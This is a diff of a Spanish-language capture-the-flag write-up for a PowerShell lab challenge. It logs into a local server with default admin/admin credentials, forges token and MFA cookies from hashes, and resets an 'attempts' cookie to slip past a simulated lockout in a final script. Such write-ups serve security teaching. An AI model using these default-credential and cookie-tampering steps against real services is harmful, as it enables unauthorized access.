@@ -1,7 +1,6 @@
 # PowerShell
 
-En este desafío se requiere el uso del interprete PowerShell. Consiste en resolver una serie de desafíos a través de la consola para evadir una suerte de defensa por parte de los elfos y ganar nuevamente acceso a las operaciones del arsenal.
-
+En este desafío se requiere el uso del intérprete PowerShell. Consiste en resolver una serie de desafíos a través de la consola para evadir una suerte de defensa por parte de los elfos y ganar nuevamente acceso a las operaciones del arsenal.
 
 ## **Primer desafío**
 Se solicita que leamos el contenido del archivo `welcome.txt` ubicado en el directorio actual:
@@ -12,16 +11,14 @@ Para ello basta con utilizar el comando `Get-Content` que tiene PowerShell:
 
 ![[ps2.png]]
 
-
 ## **Segundo desafío**
-Ahora debemos contar el numero de palabras que existen en el archivo, entonces escribimos la ruta del archivo utilizamos nuevamente el comando `Get-Content` y pipeamos el output a un segundo comando `Measure-Object` junto con la flag `–Word`:
+Ahora debemos contar el número de palabras que existen en el archivo, entonces escribimos la ruta del archivo, utilizamos nuevamente el comando `Get-Content` y pipeamos el output a un segundo comando `Measure-Object` junto con la flag `–Word`:
 
-```powershell 
+```powershell
 Get-Content ./welcome.txt | Measure-Object -Word
 ```
 
 ![[ps3_2.png]]
-
 
 ## **Tercer desafío**
 Ahora nos dice que hay un servidor escuchando para nuevas conexiones, para ver todos los sockets en escucha se puede utilizar el comando `netstat` junto con 
@@ -29,9 +26,8 @@ la flag `l` o `--listening`:
 
 ![[ps4_2.png]]
 
-
 ## **Cuarto desafío**
-Ahora debemos comunicarnos con el servidor y ver cual es el status code que nos devuelve, para ello existe el comando `Invoke-WebRequest`, es necesario indicar la URI mediante la flag `-Uri`:
+Ahora debemos comunicarnos con el servidor y ver cuál es el status code que nos devuelve. Para ello existe el comando `Invoke-WebRequest`. Es necesario indicar la URI mediante la flag `-Uri`:
 
 ```powershell
 Invoke-WebRequest -Uri 127.0.0.1:1225
@@ -39,11 +35,11 @@ Invoke-WebRequest -Uri 127.0.0.1:1225
 
 ![[ps5.png]]
 
-El servidor response con status code 401.
-
+El servidor responde con status code 401.
 
 ## **Quinto desafío**
-Ahora nos dice que intentemos autenticarnos con credenciales standard de usuario administrador, es decir, *user: admin*, *password: admin*, esto lo podemos hacer ejecutando una serie de comandos:
+Ahora nos dice que intentemos autenticarnos con credenciales estándar de usuario administrador, es decir, *user: admin*, *password: admin*. Esto lo podemos hacer ejecutando una serie de comandos:
+
 ```powershell
 $user = 'admin'
 $pass = 'admin'
@@ -61,12 +57,13 @@ $Headers = @{
 Invoke-WebRequest -Uri '127.0.0.1:1225' -Headers $Headers
 ```
 
+
 ![[ps6.png]]
 
 
 
 ## **Sexto desafío**
-Ahora es necesario que descarguemos todos los contenidos de los endpoints utilizando un loop, en la propiedad "Links" que devuelve la request se encuentran todos los endpoints, para ver todos los links podemos expandir la propiedad pipeando el resultado a `Select-Object -ExpandProperty links`:
+Ahora es necesario que descarguemos todos los contenidos de los endpoints utilizando un loop. En la propiedad "Links" que devuelve la request se encuentran todos los endpoints. Para ver todos los links podemos expandir la propiedad pipeando el resultado a `Select-Object -ExpandProperty links`:
 
 ```powershell
 Invoke-WebRequest -Uri '127.0.0.1:1225' -Headers $Headers | Select-Object -ExpandProperty links
@@ -74,7 +71,7 @@ Invoke-WebRequest -Uri '127.0.0.1:1225' -Headers $Headers | Select-Object -Expan
 
 ![[ps8.png]]
 
-Aquí se puede ver que existen 50 endpoints, entonces podemos crear un loop para que realice 50 iteraciones, recuperando cada uno de los documentos y contar las palabras que hay en ellos:
+Aquí se puede ver que existen 50 endpoints, entonces podemos crear un loop para que realice 50 iteraciones, recuperando cada uno de los documentos y contando las palabras que hay en ellos:
 
 ```powershell
 1..50 | ForEach-Object { Invoke-WebRequest 127.0.0.1:1225/endpoints/$_ -Headers $Headers | measure -word }
@@ -94,7 +91,7 @@ Get-Content file13.txt
 
 
 ## **Séptimo desafío**
-El contenido del archivo `file13.txt` revelan la existencia de un archivo con extension `.csv`, para ver su contenido podemos aplicar los mismos comandos que la vez anterior, cambiando simplemente la URI y el nombre del archivo de salida:
+El contenido del archivo `file13.txt` revela la existencia de un archivo con extensión `.csv`. Para ver su contenido podemos aplicar los mismos comandos que la vez anterior, cambiando simplemente la URI y el nombre del archivo de salida:
 
 ```powershell
 Invoke-WebRequest -Uri 127.0.0.1:1225/token_overview.csv -Headers $Headers -OutFile token_overview.csv
@@ -106,18 +103,18 @@ Get-Content token_overview.csv
 
 
 ## **Octavo desafío**
-Al parecer existe un endpoint que no esta redactado y basado en la respuesta del servidor, el endpoint se encuentra en `http://127.0.0.1:1225/tokens/<sha256sum>` en donde `<sha256sum>` es un placeholder para un checksum SHA256, aquí es donde se puede colocar el checksum del endpoint no redactado `4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C`:
+Al parecer existe un endpoint que no está redactado. Basado en la respuesta del servidor, el endpoint se encuentra en `http://127.0.0.1:1225/tokens/<sha256sum>`, en donde `<sha256sum>` es un placeholder para un checksum SHA256. Aquí se puede colocar el checksum del endpoint no redactado: `4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C`:
 
 ```powershell
 Invoke-WebRequest -Uri 127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Headers $Headers 
 ```
 
-Intente colocando el mismo valor SHA256 como cookie agregándolo a la variable de entorno `headers` que antes había creado, pero no funciono:
+Intenté colocando el mismo valor SHA256 como cookie agregándolo a la variable de entorno `headers` que antes había creado, pero no funcionó, el servidor decía que faltaba una cookie 'token', entonces coloque la nueva cookie en los headers con el valor del hash SHA256:
 
 ```powershell
 $Headers = @{
     Authorization = $basicAuthValue
-    'Cookie'='token=4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C'
+	Cookie='token=4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C'
 }
 ```
 
@@ -127,12 +124,12 @@ Invoke-WebRequest -Uri 127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F2487
 
 ![[ps14.png]]
 
-En ese momento se me ocurrió intentar con el hash MD5 correspondiente al token modificando nuevamente la variable `headers`:
+En ese momento se me ocurrió intentar con el hash MD5 correspondiente al token, modificando nuevamente la variable `headers`:
 
 ```powershell
 $Headers = @{
     Authorization = $basicAuthValue
-    'Cookie'='token=5f8dd236f862f4507835b0e418907ffc'
+    Cookie='token=5f8dd236f862f4507835b0e418907ffc'
 }
 ```
 
@@ -143,8 +140,7 @@ Invoke-WebRequest -Uri 127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F2487
 
 
 ## **Noveno desafío**
-El servidor respondió con un código MFA e indicando que debemos establecerlo dentro del valor de la cookie `mfa_code`, en 
-la URI `http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C`:
+El servidor respondió con un código MFA e indicó que debemos establecerlo dentro del valor de la cookie `mfa_code`, en la URI `http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C`:
 
 ![[ps15.png]]
 
@@ -159,7 +155,6 @@ $Headers = @{
 ```powershell
 Invoke-WebRequest -Uri 127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Headers $Headers
 ```
-
 
 
 ## **Décimo desafío**
@@ -181,7 +176,11 @@ $Headers = @{
 (Invoke-WebRequest 127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Headers $Headers).Content
 ```
 
-El servidor responde con un **Base64**: `Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg==`
+El servidor responde con un **Base64**: 
+
+```
+Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg==
+```
 
 Ahora resta decodificarlo, esto puede hacerse utilizando:
 
@@ -197,13 +196,14 @@ Write-Output $decoded
 
 Tal y como puede verse en la imagen, el output contiene la contraseña personal "*SnowLeopard2ReadyForAction*".
 
-Luego de completado, el elfo nos dice que es posible hacer un bypass de lo que hicimos anteriormente y escribir un script para completar el desafío. Ademas, nos da pistas acerca de como podemos lograrlo:
+## **Hard Mode (Gold)**
+Luego de completado, el elfo nos dice que es posible hacer un bypass de lo que hicimos anteriormente y escribir un script para completar el desafío. Además, nos da pistas acerca de cómo podemos lograrlo:
 
 ![[ps18.png]]
 
 ![[ps19.png]]
 
-Lo primero que se me ocurrió fue iterar sobre las filas del archivo `token_overview.csv` que contiene los endpoints (en principio) redactados y crear un archivo que contenga el Hash MD5, luego pipear cada uno de los contenidos de los archivos a `Get-FileHash -Algorithm SHA256` para obtener todos los hashes. Una vez hecho esto intentar verificar los endpoints contra la URI `http://127.0.0.1:1225/tokens/<sha256sum>`.
+Lo primero que se me ocurrió fue iterar sobre las filas del archivo `token_overview.csv` que contiene los endpoints (en principio) redactados y crear un archivo que contenga el Hash MD5, luego pipear cada uno de los contenidos de los archivos a `Get-FileHash -Algorithm SHA256` para obtener todos los hashes. Una vez hecho esto, intentar verificar los endpoints contra la URI `http://127.0.0.1:1225/tokens/<sha256sum>`.
 
 Luego defino el siguiente script:
 
@@ -239,9 +239,36 @@ Luego de ejecutado el script, obtuve:
 
 ![[ps21.png]]
 
+Al parecer se está seteando una cookie "attempts", lo que se condice con lo que el elfo había dicho sobre el protocolo _EDR_. Entonces volví a ejecutar los mismos comandos que usé previamente, pero esta vez agregando la cookie "attempts" con un valor inicialmente de 50 para probar.
 
-Probar hasheando un md5 e ir contra el endpoint the mfa (mfa code endpoint)
+```powershell
+$csv = "token_overview.csv"
 
+Import-Csv -Path $csv | ForEach-Object {
+	$md5 = $_.file_MD5hash
+	$temp = New-TemporaryFile
+	$md5 | Out-File -FilePath $temp.FullName -Encoding ASCII
+	$hash = (Get-FileHash -Path $temp.FullName -Algorithm SHA256).Hash.Trim()
+	Remove-Item -Path $temp.FullName -Force
 
-Al parecer
+	$Headers = @{
+	    Authorization = $basicAuthValue
+	    Cookie = "token=$md5"
+	}
 
+	$mfa = (Invoke-WebRequest -Uri 127.0.0.1:1225/tokens/$hash -Headers $Headers).Links.href
+
+	$Headers = @{
+	    Authorization = $basicAuthValue
+	    Cookie = "token=$md5; mfa_token=$mfa; attempts=50"
+	}
+
+	(Invoke-WebRequest 127.0.0.1:1225/mfa_validate/$hash -Headers $Headers).Content
+}
+```
+
+El output fue exitoso:
+
+![[ps22.png]]
+
+Aqui termina el desafío.
